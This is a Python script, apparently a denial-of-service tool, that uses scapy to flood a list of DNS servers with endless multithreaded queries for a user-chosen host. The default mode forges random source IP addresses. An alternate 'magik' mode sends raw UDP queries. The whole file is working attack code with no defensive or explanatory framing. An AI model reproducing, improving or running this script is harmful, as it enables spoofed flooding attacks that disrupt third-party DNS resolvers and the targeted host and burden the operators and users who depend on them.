from scapy.all import *
import threading
import socket
import time
import sys

sent = 0

active_threads = 0
max_threads = 100

with open("dnsservers.txt") as file:
    dns_servers = file.read().splitlines()
    file.close()

def random_ip():
    ip = []
    for _ in range(4):
        ip.append(str(random.randrange(256)))
    ip = ".".join(ip)
    return ip

def dns(host, dns_server="1.1.1.1"):
    try:
        global active_threads
        global sent
        active_threads += 1
        if not "magik" in sys.argv:
            packet = IP(dst=dns_server) / UDP() / DNS(qd=DNSQR(qname=host))
            while True:
                packet[IP].src = random_ip()
                sr1(packet, verbose=0, timeout=0)
                sent += 1
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = DNS(qd=DNSQR(qname=host))
            while True:
                packet = bytes(packet)
                sock.sendto(packet, (dns_server, 53))
                sent += 1
    except Exception as e:
        print(f"dns error: {e}")
        pass
    finally:
        active_threads -= 1

def verbose():
    try:
        while True:
            time.sleep(1)
            print(f"Sent -> {sent}")
    except KeyboardInterrupt:
        exit()


def flood_initializer(host: str) -> None:
    while True:
        for dns_server in dns_servers:
            while True:
                if active_threads >= max_threads:
                    continue
                threading.Thread(target=dns, args=[host, dns_server], daemon=True).start()
                break

def main():
    host = input("Host: ")
    threading.Thread(target=flood_initializer, args=[host], daemon=True).start()
    verbose()

if __name__ == "__main__":
    main()
